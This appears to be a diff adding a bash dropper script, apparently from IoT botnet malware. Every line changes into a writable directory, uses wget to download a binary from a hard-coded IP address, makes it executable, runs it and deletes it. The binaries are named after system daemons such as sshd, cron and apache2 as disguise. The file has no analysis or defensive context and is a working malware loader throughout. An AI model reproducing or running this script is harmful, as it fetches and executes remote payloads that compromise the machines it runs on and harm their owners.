@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://137.74.148.226/hackersntpd; chmod +x hackersntpd; ./hackersntpd; rm -rf hackersntpd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://137.74.148.226/hackerssshd; chmod +x hackerssshd; ./hackerssshd; rm -rf hackerssshd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://137.74.148.226/hackersopenssh; chmod +x hackersopenssh; ./hackersopenssh; rm -rf hackersopenssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://137.74.148.226/hackersbash; chmod +x hackersbash; ./hackersbash; rm -rf hackersbash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://137.74.148.226/hackerstftp; chmod +x hackerstftp; ./hackerstftp; rm -rf hackerstftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://137.74.148.226/hackerswget; chmod +x hackerswget; ./hackerswget; rm -rf hackerswget
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://137.74.148.226/hackerscron; chmod +x hackerscron; ./hackerscron; rm -rf hackerscron
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://137.74.148.226/hackersftp; chmod +x hackersftp; ./hackersftp; rm -rf hackersftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://137.74.148.226/hackerspftp; chmod +x hackerspftp; ./hackerspftp; rm -rf hackerspftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://137.74.148.226/hackerssh; chmod +x hackerssh; ./hackerssh; rm -rf hackerssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://137.74.148.226/hackersshit; chmod +x hackersshit; ./hackersshit; rm -rf hackersshit
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://137.74.148.226/hackersapache2; chmod +x hackersapache2; ./hackersapache2; rm -rf hackersapache2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://137.74.148.226/hackerstelnetd; chmod +x hackerstelnetd; ./hackerstelnetd; rm -rf hackerstelnetd
